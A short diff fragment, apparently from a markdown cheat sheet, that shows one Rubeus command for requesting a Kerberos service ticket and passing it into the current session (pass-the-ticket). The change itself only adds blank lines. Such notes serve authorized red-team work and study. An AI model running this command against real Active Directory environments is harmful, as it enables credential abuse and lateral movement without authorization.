@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:36:05.391024+00:00'
 ```bash
 .\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
 ```
+
+
